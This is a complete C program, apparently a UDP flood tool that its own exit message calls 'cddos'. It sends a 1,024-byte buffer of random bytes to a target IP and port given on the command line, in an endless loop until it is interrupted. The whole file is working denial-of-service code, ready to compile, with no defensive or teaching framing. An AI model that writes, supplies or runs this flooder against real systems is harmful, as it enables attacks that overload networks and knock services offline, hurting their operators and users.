#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>

#include <arpa/inet.h>
#include <sys/socket.h>

const ssize_t BYTES_LENGTH = 256 * 4;
bool is_running = true;

void error(const char *message)
{
  perror(message);
  exit(EXIT_FAILURE);
}

void stop(int sigint)
{
  is_running = false;
}

int main(int argc, const char *argv[])
{
  if(argc < 3)
    error("Usage: ./[EXECUTABLE] 0.0.0.0 80");

  const char *IP_TARGET = argv[1];
  const int PORT = atoi(argv[2]);

  int socketfd = socket(AF_INET, SOCK_DGRAM, 0);
  if(socketfd < 0)
    error("Error opening socket");

  struct sockaddr_in target_address;
  memset(&target_address, 0, sizeof(target_address));

  target_address.sin_family = AF_INET;
  target_address.sin_port = htons(PORT);
  if(inet_pton(AF_INET, IP_TARGET, &target_address.sin_addr) <= 0)
    error("Error converting IP address");
  
  char *buffer = (char*) malloc(BYTES_LENGTH);
  if(buffer == NULL)
    error("Error allocating memory for random bytes");

  for(int i = 0; i < BYTES_LENGTH; i++)
    buffer[i] = rand() % 256;

  signal(SIGINT, stop);

  puts("Running... Ctrl+C to exit");
  while (is_running)
    if(sendto(socketfd, buffer, BYTES_LENGTH, 0, (struct sockaddr*) &target_address, sizeof(target_address)) < 0)
      error("Error sending data");
  puts("\nExting cddos...");

  close(socketfd);
  free(buffer);

  return EXIT_SUCCESS;
}